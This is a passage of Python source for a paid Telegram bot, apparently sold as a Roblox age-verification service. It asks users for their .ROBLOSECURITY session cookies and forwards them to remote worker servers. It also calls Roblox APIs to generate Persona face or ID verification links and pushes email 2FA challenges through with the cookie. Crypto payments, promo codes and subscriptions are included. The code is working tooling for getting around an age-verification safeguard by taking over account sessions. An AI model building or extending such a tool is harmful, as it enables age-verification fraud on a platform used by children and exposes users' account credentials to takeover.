# -*- coding: utf-8 -*-
import os
import re
import logging
import requests
import asyncio
import time as _time
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes, ConversationHandler
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

def escape_md(text: str) -> str:
    """Экранирует спецсимволы Markdown v1 (используемого в parse_mode='Markdown')."""
    return re.sub(r'([_*\[\]`\\])', r'\\\1', str(text))

BOT_TOKEN        = os.environ.get("BOT_TOKEN")
CRYPTO_BOT_TOKEN = os.environ.get("CRYPTO_BOT_TOKEN", "")
DATABASE_URL     = os.environ.get("DATABASE_URL", "")  # PostgreSQL URL для Railway

_WORKER_URLS = [
    u.strip() for u in [
        os.environ.get("WORKER_1_URL", ""),
        os.environ.get("WORKER_2_URL", ""),
        os.environ.get("WORKER_3_URL", ""),
        os.environ.get("WORKER_4_URL", ""),
    ] if u.strip()
]
WORKER_SECRET = os.environ.get("WORKER_SECRET")
if not WORKER_SECRET:
    raise RuntimeError("WORKER_SECRET environment variable must be set")
_worker_index = 0
_worker_lock = __import__("threading").Lock()

_worker_health = {url: True for url in _WORKER_URLS}
_worker_health_lock = __import__("threading").Lock()
WORKER_HEALTH_TTL = int(os.environ.get("WORKER_HEALTH_TTL", 30))
_worker_dead_since: dict[str, float] = {}

def _mark_worker(url: str, alive: bool):
    with _worker_health_lock:
        _worker_health[url] = alive
        if alive:
            _worker_dead_since.pop(url, None)
        else:
            _worker_dead_since.setdefault(url, _time.time())

def _worker_considered_alive(url: str) -> bool:
    with _worker_health_lock:
        if _worker_health.get(url, True):
            return True
        dead_since = _worker_dead_since.get(url, 0)
        if (_time.time() - dead_since) >= WORKER_HEALTH_TTL:
            # TTL истёк — сбрасываем флаг, воркер снова считается живым
            _worker_health[url] = True
            _worker_dead_since.pop(url, None)
            return True
        return False

def get_worker_order() -> list[str]:
    global _worker_index
    if not _WORKER_URLS:
        return []
    with _worker_lock:
        start = _worker_index % len(_WORKER_URLS)
        _worker_index += 1
    ordered = _WORKER_URLS[start:] + _WORKER_URLS[:start]
    alive = [u for u in ordered if _worker_considered_alive(u)]
    dead  = [u for u in ordered if u not in alive]
    return alive + dead

def call_worker_2fa(cookie: str, method: str) -> "str | dict | None":
    """
    Вызывает воркер для получения ссылки верификации.
    Возвращает:
      - str: готовая ссылка withpersona.com
      - dict с ключами challengeId/csrf: воркер отправил email-код, нужен ввод от юзера
      - None: все воркеры недоступны или вернули ошибку
    """
    order = get_worker_order()
    if not order:
        return get_url_via_api_2fa(cookie, method)
    for worker_url in order:
        try:
            worker_timeout = int(os.environ.get("WORKER_TIMEOUT", 320))
            r = requests.post(
                f"{worker_url}/get-link",
                json={"cookie": cookie, "method": method, "secret": WORKER_SECRET},
                headers={"X-Secret": WORKER_SECRET},
                timeout=worker_timeout,
            )
            if r.status_code == 200:
                _mark_worker(worker_url, True)
                data = r.json()
                # Воркер может вернуть ссылку напрямую (без 2FA или 2FA уже пройдена)
                if data.get("link"):
                    return data["link"]
                # Воркер отправил email-код и ждёт подтверждения — возвращаем challenge
                if data.get("challengeId") and data.get("csrf"):
                    return {
                        "challengeId": data["challengeId"],
                        "csrf": data["csrf"],
                        "emailSent": data.get("emailSent", False),
                    }
                return None
            if r.status_code == 503:
                _mark_worker(worker_url, False)
            continue
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            _mark_worker(worker_url, False)
            continue
        except Exception as e:
            logging.warning("call_worker_2fa error for %s: %s", worker_url, e)
            continue
    return None

ADMIN_IDS: set[int] = set()
for _x in os.environ.get("ADMIN_IDS", "0").split(","):
    try:
        if _x.strip():
            ADMIN_IDS.add(int(_x.strip()))
    except ValueError:
        logging.warning("Invalid ADMIN_IDS value: %r — пропускаем", _x)
LOG_CHANNEL_ID = os.environ.get("LOG_CHANNEL_ID", "")

executor = ThreadPoolExecutor(max_workers=20)
pending_payments = {}

WAITING_LANG                        = 0
WAITING_MENU                        = 1
WAITING_COOKIE                      = 2
WAITING_BUY                         = 3
WAITING_PAYMENT                     = 4
WAITING_PROMO                       = 5
WAITING_ADMIN                       = 6
# WAITING_ADMIN_BROADCAST = 7  # убрано — состояние не реализовано
WAITING_ADMIN_ADD_BALANCE           = 8
WAITING_ADMIN_ADD_BALANCE_AMOUNT    = 9
WAITING_ADMIN_CREATE_PROMO          = 10
WAITING_ADMIN_ADD_SUB               = 11
WAITING_ADMIN_REMOVE_BALANCE        = 12
WAITING_ADMIN_REMOVE_BALANCE_AMOUNT = 13
WAITING_2FA_CODE                    = 15  # ожидание кода 2FA от пользователя

PRICE_2FA    = 1.00
DISCOUNTS_2FA = {5: 0.05, 10: 0.10, 15: 0.15, 25: 0.20}
SUBSCRIPTIONS = {1: 3.00, 3: 5.00, 7: 10.00, 30: 25.00, 0: 50.00}

# ─────────────────────────── DATABASE ───────────────────────────

import psycopg2
import psycopg2.extras
from contextlib import contextmanager

@contextmanager
def _db():
    conn = psycopg2.connect(DATABASE_URL)
    try:
        yield conn
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()

def db_init():
    with _db() as conn:
        c = conn.cursor()
        c.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                username TEXT,
                attempts INTEGER DEFAULT 0,
                spent REAL DEFAULT 0.0,
                lang TEXT DEFAULT 'ru'
            )
        """)
        # Миграция: добавляем колонку lang если её нет (для существующих БД)
        c.execute("""
            ALTER TABLE users ADD COLUMN IF NOT EXISTS lang TEXT DEFAULT 'ru'
        """)
        c.execute("""
            CREATE TABLE IF NOT EXISTS promo_codes (
                code TEXT PRIMARY KEY,
                attempts INTEGER DEFAULT 1,
                uses INTEGER DEFAULT 0,
                max_uses INTEGER DEFAULT 1
            )
        """)
        c.execute("""
            CREATE TABLE IF NOT EXISTS used_promos (
                user_id BIGINT,
                code TEXT,
                PRIMARY KEY (user_id, code)
            )
        """)
        c.execute("""
            CREATE TABLE IF NOT EXISTS subscriptions (
                user_id BIGINT PRIMARY KEY,
                expires_at TEXT,
                is_forever INTEGER DEFAULT 0
            )
        """)

def db_get_user(user_id):
    with _db() as conn:
        c = conn.cursor()
        c.execute("SELECT username, attempts, spent FROM users WHERE user_id=%s", (user_id,))
        return c.fetchone()

def db_upsert_user(user_id, username, attempts_delta=0, spent_delta=0.0):
    with _db() as conn:
        c = conn.cursor()
        c.execute("""
            INSERT INTO users (user_id, username, attempts, spent)
            VALUES (%s, %s, %s, %s)
            ON CONFLICT (user_id) DO UPDATE
            SET username=EXCLUDED.username,
                attempts=GREATEST(0, users.attempts + %s),
                spent=GREATEST(0.0, users.spent + %s)
        """, (user_id, username, max(0, attempts_delta), max(0.0, spent_delta), attempts_delta, spent_delta))

def db_get_attempts(user_id):
    row = db_get_user(user_id)
    return row[1] if row else 0

def db_deduct_attempt(user_id, username) -> bool:
    """Атомарно списывает 1 попытку. Возвращает True если попытка была и списана.
    БАГ-1: один атомарный UPDATE вместо SELECT + UPDATE (защита от race condition)."""
    with _db() as conn:
        c = conn.cursor()
        c.execute("""
            UPDATE users
            SET attempts = attempts - 1,
                spent    = GREATEST(0.0, spent + %s)
            WHERE user_id = %s AND attempts > 0
        """, (PRICE_2FA, user_id))
        if c.rowcount == 0:
            return False
        # Обновляем username попутно
        c.execute("UPDATE users SET username = %s WHERE user_id = %s", (username, user_id))
        return True

def db_get_all_users():
    with _db() as conn:
        c = conn.cursor()
        c.execute("SELECT user_id, username, attempts, spent FROM users ORDER BY spent DESC")
        return c.fetchall()

def db_get_top(limit=10):
    with _db() as conn:
        c = conn.cursor()
        c.execute("SELECT user_id, username, spent FROM users WHERE spent > 0 ORDER BY spent DESC LIMIT %s", (limit,))
        return c.fetchall()

def db_create_promo(code, attempts, max_uses):
    with _db() as conn:
        c = conn.cursor()
        c.execute("""
            INSERT INTO promo_codes (code, attempts, uses, max_uses)
            VALUES (%s, %s, 0, %s)
            ON CONFLICT (code) DO UPDATE
            SET attempts=EXCLUDED.attempts, max_uses=EXCLUDED.max_uses
            -- БАГ-12: uses намеренно НЕ сбрасывается при обновлении промокода
        """, (code, attempts, max_uses))

def db_use_promo(user_id, code, username=""):
    """Атомарно проверяет промокод и начисляет попытки.
    БАГ-2: UPDATE с условием uses < max_uses вместо SELECT→check→UPDATE (защита от TOCTOU race)."""
    with _db() as conn:
        c = conn.cursor()
        # Сначала проверяем существование кода и что пользователь ещё не использовал
        c.execute("SELECT attempts, max_uses FROM promo_codes WHERE code=%s", (code,))
        row = c.fetchone()
        if not row:
            return False, "not_found", 0
        attempts, max_uses = row
        c.execute("SELECT 1 FROM used_promos WHERE user_id=%s AND code=%s", (user_id, code))
        if c.fetchone():
            return False, "used_by_you", 0
        # БАГ-2: атомарное увеличение uses только если ещё не исчерпан лимит
        c.execute(
            "UPDATE promo_codes SET uses = uses + 1 WHERE code = %s AND uses < max_uses",
            (code,)
        )
        if c.rowcount == 0:
            return False, "used", 0
        c.execute("INSERT INTO used_promos (user_id, code) VALUES (%s, %s)", (user_id, code))
        # Атомарно начисляем попытки в той же транзакции
        c.execute("""
            INSERT INTO users (user_id, username, attempts, spent)
            VALUES (%s, %s, %s, 0.0)
            ON CONFLICT (user_id) DO UPDATE
            SET attempts=GREATEST(0, users.attempts + %s)
        """, (user_id, username, max(0, attempts), attempts))
        return True, "ok", attempts

def db_get_all_promos():
    with _db() as conn:
        c = conn.cursor()
        c.execute("SELECT code, attempts, uses, max_uses FROM promo_codes")
        return c.fetchall()

def db_get_subscription(user_id):
    import datetime
    with _db() as conn:
        c = conn.cursor()
        c.execute("SELECT expires_at, is_forever FROM subscriptions WHERE user_id=%s", (user_id,))
        row = c.fetchone()
    if not row:
        return False, None, False
    expires_at_str, is_forever = row
    if is_forever:
        return True, "Навсегда", True
    if expires_at_str:
        try:
            exp = datetime.datetime.fromisoformat(expires_at_str)
            now = datetime.datetime.now(datetime.timezone.utc)
            # Если exp не содержит timezone — считаем UTC
            if exp.tzinfo is None:
                exp = exp.replace(tzinfo=datetime.timezone.utc)
            if exp > now:
                return True, expires_at_str, False
        except Exception:
            pass
    return False, expires_at_str, False

def db_set_subscription(user_id, days):
    import datetime
    with _db() as conn:
        c = conn.cursor()
        if days == 0:
            c.execute("""
                INSERT INTO subscriptions (user_id, expires_at, is_forever)
                VALUES (%s, NULL, 1)
                ON CONFLICT (user_id) DO UPDATE SET expires_at=NULL, is_forever=1
            """, (user_id,))
        else:
            c.execute("SELECT expires_at, is_forever FROM subscriptions WHERE user_id=%s", (user_id,))
            existing = c.fetchone()
            now = datetime.datetime.now(datetime.timezone.utc)
            if existing and not existing[1] and existing[0]:
                try:
                    exp = datetime.datetime.fromisoformat(existing[0])
                    if exp.tzinfo is None:
                        exp = exp.replace(tzinfo=datetime.timezone.utc)
                    if exp > now:
                        now = exp
                except Exception:
                    pass
            new_exp = (now + datetime.timedelta(days=days)).isoformat()
            c.execute("""
                INSERT INTO subscriptions (user_id, expires_at, is_forever)
                VALUES (%s, %s, 0)
                ON CONFLICT (user_id) DO UPDATE SET expires_at=%s, is_forever=0
            """, (user_id, new_exp, new_exp))

def db_get_lang(user_id):
    with _db() as conn:
        c = conn.cursor()
        c.execute("SELECT lang FROM users WHERE user_id=%s", (user_id,))
        row = c.fetchone()
    return row[0] if row else None  # None = новый пользователь, язык не выбран

def db_set_lang(user_id, lang):
    with _db() as conn:
        c = conn.cursor()
        c.execute("""
            INSERT INTO users (user_id, lang) VALUES (%s, %s)
            ON CONFLICT (user_id) DO UPDATE SET lang=EXCLUDED.lang
        """, (user_id, lang))

def db_is_new_user(user_id) -> bool:
    with _db() as conn:
        c = conn.cursor()
        c.execute("SELECT 1 FROM users WHERE user_id=%s", (user_id,))
        return c.fetchone() is None

# ─────────────────────────── TEXTS ───────────────────────────

TEXTS = {
    "ru": {
        "main_menu_title": "*Roblox Age Verification Bot*",
        "main_menu_sub": "Сервис для получения ссылки by @dedbed12",
        "main_menu_attempts": "🔐 Попытки 2FA: *{attempts}* | {sub_status}",
        "main_menu_action": "Выберите действие ниже:",
        "btn_get_link": "Получить ссылку",
        "btn_buy": "Купить попытки",
        "btn_promo": "Промокод",
        "btn_top": "Топ пользователей",
        "btn_help": "Помощь",
        "btn_support": "Саппорт",
        "btn_admin": "Админ панель",
        "btn_back": "Назад",
        "btn_cancel": "Отмена",
        "btn_buy_1": "1 попытка 2FA — $1.00",
        "btn_buy_5": "5 попыток 2FA — $4.75 (−5%)",
        "btn_buy_10": "10 попыток 2FA — $9.00 (−10%)",
        "btn_buy_15": "15 попыток 2FA — $12.75 (−15%)",
        "btn_buy_25": "25 попыток 2FA — $20.00 (−20%)",
        "btn_sub_1d": "📅 1 день — $3.00",
        "btn_sub_3d": "📅 3 дня — $5.00",
        "btn_sub_7d": "📅 7 дней — $10.00",
        "btn_sub_30d": "📅 30 дней — $25.00",
        "btn_sub_inf": "♾️ Навсегда — $50.00",
        "btn_buy_attempts": "🎯 Попытки 2FA",
        "btn_buy_sub": "♾️ Подписка (безлимит)",
        "sub_active": "✅ Подписка активна до: *{expires}*",
        "sub_active_forever": "✅ Подписка: *Навсегда*",
        "sub_none": "❌ Подписки нет",
        "sub_bought": "✅ Подписка активирована!\n{desc}",
        "help_text": "*Помощь*\n\n🔓 Без 2FA — *БЕСПЛАТНО*\n🔐 С 2FA — *$1.00* за попытку\n♾️ Подписка 2FA — безлимит",
        "top_title": "*Топ пользователей*\n",
        "top_empty": "Пока никто не совершил покупок.",
        "buy_title": "*Магазин*",
        "buy_price": "🔓 Без 2FA — *БЕСПЛАТНО*\n🔐 С 2FA — *$1.00* за попытку",
        "promo_title": "*Активация промокода*",
        "promo_enter": "Введите промокод:",
        "promo_ok": "Промокод активирован! +*{attempts}* попыток\nВсего: *{total}*",
        "promo_not_found": "Промокод не найден!",
        "promo_used": "Промокод уже использован!",
        "promo_used_by_you": "Вы уже использовали этот промокод!",
        "checking_cookie": "Проверяю cookie...",
        "invalid_cookie": "Неверный cookie! Попробуй снова.\n\n/start",
        "processing": "Аккаунт: *{name}*\nМетод: *{method}*\nОсталось попыток: *{attempts}*\n\nЖди 20-30 сек...",
        "link_received": "*Ссылка получена!*\n\n⏱ Действует *10 минут* — используй сразу!\n🔗 Одноразовая ссылка:",
        "failed_returned": "❌ Не удалось получить ссылку — попытка возвращена!",
        "method_camera": "Camera",
        "method_id": "ID",
        "choose_method": "*Выберите метод верификации:*",
        "btn_camera": "📷 Camera (Лицо)",
        "btn_id": "🪪 ID (Паспорт)",
        "invoice_created": "*Счёт создан!*\n\nСумма: *${amount}*\nПопыток: *{attempts}*",
        "btn_check_pay": "✅ Проверить оплату",
        "btn_pay": "💳 Оплатить",
        "pay_ok": "*Оплата получена!*\nНачислено *{attempts}* попыток\nВсего: *{total}*",
        "pay_pending": "Оплата ещё не получена. Попробуй позже.",
        "pay_error": "Ошибка создания счёта!",
        "lang_set": "✅ Язык установлен: Русский",
        "ask_2fa": "На каком аккаунте получить ссылку?",
        "btn_no_2fa": "🔓 Без 2FA",
        "btn_with_2fa": "🔐 С 2FA",
        "2fa_ask_cookie": "🔐 *Режим 2FA*\n\nОтправь `.ROBLOSECURITY` cookie",
        "no2fa_ask_cookie": "🔓 *Режим БЕЗ 2FA*\n\nОтправь `.ROBLOSECURITY` cookie",
        "choose_lang": "🌐 Выберите язык / Choose language:",
    },
    "en": {
        "main_menu_title": "*Roblox Age Verification Bot*",
        "main_menu_sub": "Service for getting verification link by @dedbed12",
        "main_menu_attempts": "🔐 2FA Attempts: *{attempts}* | {sub_status}",
        "main_menu_action": "Choose an action below:",
        "btn_get_link": "Get link",
        "btn_buy": "Buy attempts",
        "btn_promo": "Promo code",
        "btn_top": "Top users",
        "btn_help": "Help",
        "btn_support": "Support",
        "btn_admin": "Admin panel",
        "btn_back": "Back",
        "btn_cancel": "Cancel",
        "btn_buy_1": "1 2FA attempt — $1.00",
        "btn_buy_5": "5 2FA attempts — $4.75 (−5%)",
        "btn_buy_10": "10 2FA attempts — $9.00 (−10%)",
        "btn_buy_15": "15 2FA attempts — $12.75 (−15%)",
        "btn_buy_25": "25 2FA attempts — $20.00 (−20%)",
        "btn_sub_1d": "📅 1 day — $3.00",
        "btn_sub_3d": "📅 3 days — $5.00",
        "btn_sub_7d": "📅 7 days — $10.00",
        "btn_sub_30d": "📅 30 days — $25.00",
        "btn_sub_inf": "♾️ Forever — $50.00",
        "btn_buy_attempts": "🎯 2FA Attempts",
        "btn_buy_sub": "♾️ Subscription (unlimited)",
        "sub_active": "✅ Subscription active until: *{expires}*",
        "sub_active_forever": "✅ Subscription: *Forever*",
        "sub_none": "❌ No subscription",
        "sub_bought": "✅ Subscription activated!\n{desc}",
        "help_text": "*Help*\n\n🔓 Without 2FA — *FREE*\n🔐 With 2FA — *$1.00* per attempt",
        "top_title": "*Top users*\n",
        "top_empty": "No purchases yet.",
        "buy_title": "*Shop*",
        "buy_price": "🔓 Without 2FA — *FREE*\n🔐 With 2FA — *$1.00* per attempt",
        "promo_title": "*Promo code activation*",
        "promo_enter": "Enter promo code:",
        "promo_ok": "Promo activated! +*{attempts}* attempts\nTotal: *{total}*",
        "promo_not_found": "Promo code not found!",
        "promo_used": "Promo code already used!",
        "promo_used_by_you": "You have already used this promo code!",
        "checking_cookie": "Checking cookie...",
        "invalid_cookie": "Invalid cookie! Try again.\n\n/start",
        "processing": "Account: *{name}*\nMethod: *{method}*\nAttempts left: *{attempts}*\n\nPlease wait 20-30 sec...",
        "link_received": "*Link received!*\n\n⏱ Valid for *10 minutes* — use it now!\n🔗 One-time link:",
        "failed_returned": "❌ Failed to get link — attempt returned!",
        "method_camera": "Camera",
        "method_id": "ID",
        "choose_method": "*Choose verification method:*",
        "btn_camera": "📷 Camera (Face)",
        "btn_id": "🪪 ID (Passport)",
        "invoice_created": "*Invoice created!*\n\nAmount: *${amount}*\nAttempts: *{attempts}*",
        "btn_check_pay": "✅ Check payment",
        "btn_pay": "💳 Pay",
        "pay_ok": "*Payment received!*\nAdded *{attempts}* attempts\nTotal: *{total}*",
        "pay_pending": "Payment not received yet. Try later.",
        "pay_error": "Invoice creation error!",
        "lang_set": "✅ Language set: English",
        "ask_2fa": "Which account type do you want to verify?",
        "btn_no_2fa": "🔓 Without 2FA",
        "btn_with_2fa": "🔐 With 2FA",
        "2fa_ask_cookie": "🔐 *2FA Mode*\n\nSend your `.ROBLOSECURITY` cookie",
        "no2fa_ask_cookie": "🔓 *No 2FA Mode*\n\nSend your `.ROBLOSECURITY` cookie",
        "choose_lang": "🌐 Выберите язык / Choose language:",
    }
}

def t(user_id, key, lang_override=None, **kwargs):
    lang = lang_override or db_get_lang(user_id) or "ru"
    text = TEXTS.get(lang, TEXTS["ru"]).get(key, TEXTS["ru"].get(key, key))
    if kwargs:
        try:
            text = text.format(**kwargs)
        except (KeyError, ValueError) as e:
            logging.error("t() format error: key=%s, kwargs=%s, err=%s", key, kwargs, e)
    return text

# ─────────────────────────── HELPERS ───────────────────────────

def get_url_via_api(cookie, method):
    try:
        s = requests.Session()
        s.cookies[".ROBLOSECURITY"] = cookie
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json;charset=utf-8",
            "Origin": "https://www.roblox.com",
            "Referer": "https://www.roblox.com/my/account#!/info",
        })
        url = "https://apis.roblox.com/age-verification-service/v1/persona-id-verification/start-verification"
        body = {"generateLink": True, "ageEstimation": True, "parentVerification": False}
        r1 = s.post(url, json=body, timeout=12)
        csrf = r1.headers.get("x-csrf-token")
        if r1.status_code == 200:
            link = _extract_link(r1)
            if link:
                return link
        if csrf:
            s.headers["x-csrf-token"] = csrf
            r2 = s.post(url, json=body, timeout=12)
            if r2.status_code == 200:
                return _extract_link(r2)
        return None
    except Exception as e:
        logging.error("API error: %s", e)
        return None

def get_url_via_api_2fa(cookie, method):
    """Fallback: прямой вызов API без воркеров (только без 2FA)."""
    return get_url_via_api(cookie, method)

def _is_persona_link(url: str) -> bool:
    """Проверяет что URL — валидная ссылка Persona с inquiry-id."""
    try:
        from urllib.parse import urlparse
        p = urlparse(url)
        return (
            p.scheme == "https"
            and (p.netloc == "withpersona.com" or p.netloc.endswith(".withpersona.com"))
            and "inquiry-id" in p.query
        )
    except Exception:
        return False

def extract_link_from_raw(body: str):
    if not body:
        return None
    m = re.search(r'https://[^\s"\'\\]+withpersona\.com[^\s"\'\\]*inquiry-id=[^\s"\'\\&]+(?:&[^\s"\'\\]*)?', body)
    if m:
        return m.group(0).rstrip("\\")
    m = re.search(r'inquiry-id=(inq_[A-Za-z0-9]+)', body)
    if m:
        inq_id = m.group(1)
        tok_m = re.search(r'session-token=([A-Za-z0-9_\-\.]+)', body)
        link = f"https://inquiry.withpersona.com/verify?inquiry-id={inq_id}"
        if tok_m:
            link += f"&session-token={tok_m.group(1)}"
        return link
    return None

def _extract_link(r) -> "str | None":
    """Извлекает Persona-ссылку из ответа: сначала из тела, затем из r.url (при redirect)."""
    link = extract_link_from_raw(r.text)
    if not link and _is_persona_link(r.url):
        link = r.url
    return link

# Хранит контекст незавершённой 2FA верификации пока пользователь вводит код
# { user_id: { cookie, csrf, challenge_id, user_roblox_id, method, attempt_was_deducted, chat_id, username, created_at } }
pending_2fa: dict[int, dict] = {}
PENDING_2FA_TTL = int(os.environ.get("PENDING_2FA_TTL", 600))  # 10 минут

def _cleanup_pending_2fa():
    """Удаляет устаревшие записи pending_2fa (защита от утечки памяти).
    Попытки НЕ возвращаются при TTL-очистке — сессия считается брошенной пользователем."""
    now = _time.time()
    expired = [uid for uid, ctx in pending_2fa.items()
               if (now - ctx.get("created_at", now)) > PENDING_2FA_TTL]
    for uid in expired:
        ctx = pending_2fa.pop(uid, None)
        if ctx:
            logging.info("pending_2fa TTL expired for user_id=%s (attempt_deducted=%s)", uid, ctx.get("attempt_was_deducted"))
    return len(expired)

def verify_2fa_code(cookie: str, user_roblox_id: int, csrf: str,
                    challenge_id: str, code: str) -> tuple[bool, str | None]:
    """
    Верифицирует 6-значный код 2FA через Roblox API.
    Возвращает (success, error_message).
    Сначала отправляет код через twostepverification, затем подтверждает challenge.
    """
    try:
        s = requests.Session()
        s.cookies[".ROBLOSECURITY"] = cookie
        s.headers.update({
            "Content-Type": "application/json;charset=utf-8",
            "x-csrf-token": csrf,
            "Origin": "https://www.roblox.com",
            "Referer": "https://www.roblox.com/",
        })

        # Шаг 1: проверяем код у Roblox 2SV API
        verify_url = f"https://twostepverification.roblox.com/v1/users/{user_roblox_id}/challenges/email/verify"
        r_verify = s.post(verify_url, json={
            "challengeId": challenge_id,
            "actionType": "Generic",
            "code": code.strip(),
        }, timeout=12)

        if r_verify.status_code == 403 and r_verify.headers.get("x-csrf-token"):
            # CSRF обновился — повторяем
            new_csrf = r_verify.headers["x-csrf-token"]
            s.headers["x-csrf-token"] = new_csrf
            r_verify = s.post(verify_url, json={
                "challengeId": challenge_id,
                "actionType": "Generic",
                "code": code.strip(),
            }, timeout=12)

        if r_verify.status_code not in (200, 204):
            body = r_verify.text[:200]
            logging.warning("verify_2fa_code step1 failed: %s %s", r_verify.status_code, body)
            # 400 = неверный код, 429 = слишком много попыток
            if r_verify.status_code == 429:
                return False, "rate_limited"
            return False, "invalid_code"

        # Шаг 2: получаем verification token из ответа
        try:
            verification_token = r_verify.json().get("verificationToken", "")
        except Exception:
            verification_token = ""

        if not verification_token:
            logging.warning("verify_2fa_code: no verificationToken in response: %s", r_verify.text[:100])
            return False, "invalid_code"

        # Шаг 3: подтверждаем challenge через основной API
        continue_url = "https://apis.roblox.com/challenge/v1/continue"
        challenge_metadata_str = (
            f'{{"rememberDevice":false,"verificationToken":"{verification_token}",'
            f'"challengeId":"{challenge_id}","actionType":"Generic"}}'
        )
        r_cont = s.post(continue_url, json={
            "challengeId": challenge_id,
            "challengeType": "twostepverification",
            "challengeMetadata": challenge_metadata_str,
        }, timeout=12)

        # CSRF мог обновиться — повторяем с новым токеном
        if r_cont.status_code == 403:
            new_csrf_cont = r_cont.headers.get("x-csrf-token")
            if new_csrf_cont:
                s.headers["x-csrf-token"] = new_csrf_cont
                r_cont = s.post(continue_url, json={
                    "challengeId": challenge_id,
                    "challengeType": "twostepverification",
                    "challengeMetadata": challenge_metadata_str,
                }, timeout=12)
                logging.info("verify_2fa_code step3 retry: status=%s", r_cont.status_code)

        if r_cont.status_code not in (200, 204):
            logging.warning(
                "verify_2fa_code step3 (continue) failed: %s %s",
                r_cont.status_code, r_cont.text[:200],
            )
            # Не фатально — иногда Roblox возвращает 400, но challenge уже принят
        else:
            logging.info("verify_2fa_code step3 (continue) OK: %s", r_cont.status_code)

        # Шаг 4: повторяем исходный запрос на получение ссылки с подтверждённым токеном
        _URL_VERIFY = "https://apis.roblox.com/age-verification-service/v1/persona-id-verification/start-verification"
        _BODY_VERIFY = {"generateLink": True, "ageEstimation": True, "parentVerification": False}
        r_final = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=12)

        # CSRF мог обновиться после step3 — повторяем финальный запрос
        if r_final.status_code == 403:
            new_csrf_final = r_final.headers.get("x-csrf-token")
            if new_csrf_final:
                s.headers["x-csrf-token"] = new_csrf_final
                r_final = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=12)
                logging.info("verify_2fa_code step4 retry: status=%s", r_final.status_code)

        if r_final.status_code == 200:
            link = _extract_link(r_final)
            if link:
                return True, link
            logging.warning("verify_2fa_code step4: 200 но ссылки нет. url=%s body=%s", r_final.url, r_final.text[:200])

        logging.warning("verify_2fa_code final request failed: %s %s", r_final.status_code, r_final.text[:200])
        return False, "link_failed"
    except Exception as e:
        logging.error("verify_2fa_code exception: %s", e)
        return False, "exception"

def create_invoice(amount, attempts):
    try:
        r = requests.post(
            "https://pay.crypt.bot/api/createInvoice",
            headers={"Crypto-Pay-API-Token": CRYPTO_BOT_TOKEN},
            json={"asset": "USDT", "amount": str(round(amount, 2)), "description": f"Pokupka {attempts} popytok", "expires_in": 300},
            timeout=15,
        )
        data = r.json()
        return data["result"] if data.get("ok") else None
    except Exception:
        return None

def check_invoice(invoice_id):
    try:
        r = requests.get(
            "https://pay.crypt.bot/api/getInvoices",
            headers={"Crypto-Pay-API-Token": CRYPTO_BOT_TOKEN},
            params={"invoice_ids": invoice_id},
            timeout=15,
        )
        data = r.json()
        return data["result"]["items"][0] if data.get("ok") and data["result"]["items"] else None
    except Exception:
        return None

async def send_log(context, user_id, username, method, elapsed_sec, has_2fa=False):
    if not LOG_CHANNEL_ID:
        logging.warning("send_log: LOG_CHANNEL_ID не задан")
        return
    try:
        cost = "$1.00" if has_2fa else "БЕСПЛАТНО"
        service = "Camera" if method == "camera" else "ID"
        msg = (
            f"✅ УСПЕШНО\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 ID: {user_id} (@{escape_md(username)})\n"
            f"⚙️ Услуга: {service}\n"
            f"✅ Результат: Ссылка получена\n"
            f"⏲️ Время: {round(elapsed_sec)} сек\n"
            f"💳 Сумма: {cost}"
        )
        await context.bot.send_message(chat_id=int(LOG_CHANNEL_ID), text=msg)
        logging.info("send_log: отправлено в %s", LOG_CHANNEL_ID)
    except Exception as e:
        logging.warning("send_log error: %s", e)

def main_menu_kb(user_id=None):
    lang = (db_get_lang(user_id) or "ru") if user_id else "ru"
    T = TEXTS[lang]
    buttons = [
        [InlineKeyboardButton(T["btn_get_link"], callback_data="get_link")],
        [InlineKeyboardButton(T["btn_buy"], callback_data="buy"), InlineKeyboardButton(T["btn_promo"], callback_data="promo")],
        [InlineKeyboardButton(T["btn_top"], callback_data="top")],
        [InlineKeyboardButton(T["btn_help"], callback_data="help"), InlineKeyboardButton(T["btn_support"], url="https://t.me/dedbed12")],
    ]
    if user_id and user_id in ADMIN_IDS:
        buttons.append([InlineKeyboardButton(T["btn_admin"], callback_data="admin")])
    return InlineKeyboardMarkup(buttons)

def _sub_status_text(user_id):
    import datetime as _dt
    attempts = db_get_attempts(user_id)
    is_active, expires, is_forever = db_get_subscription(user_id)
    lang = db_get_lang(user_id) or "ru"
    if is_active and is_forever:
        return "∞", ("♾️ Forever" if lang == "en" else "♾️ Навсегда")
    elif is_active:
        try:
            exp = _dt.datetime.fromisoformat(expires)
            now_utc = _dt.datetime.now(_dt.timezone.utc)
            if exp.tzinfo is None:
                exp = exp.replace(tzinfo=_dt.timezone.utc)
            delta = exp - now_utc
            total_min = max(0, int(delta.total_seconds() // 60))
            h, m = divmod(total_min, 60)
            remaining = f"{h}h {m}m" if lang == "en" else f"{h}ч {m}мин"
        except Exception:
            remaining = "?"
        return "∞", remaining
    else:
        return str(attempts), ("No sub" if lang == "en" else "Нет под.")

def _lang_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🇷🇺 Русский", callback_data="set_lang_ru"),
         InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en")]
    ])

# ─────────────────────────── HANDLERS ───────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    tg = update.effective_user
    username = tg.username or tg.first_name or "Аноним"

    is_new = db_is_new_user(user_id)

    # Регистрируем пользователя (без языка для нового)
    if is_new:
        db_upsert_user(user_id, username)
        # Просим выбрать язык
        await update.message.reply_text(
            "🌐 Выберите язык / Choose language:",
            reply_markup=_lang_kb()
        )
        return WAITING_LANG

    # Старый пользователь — сразу главное меню
    db_upsert_user(user_id, username)
    attempts, sub_status = _sub_status_text(user_id)
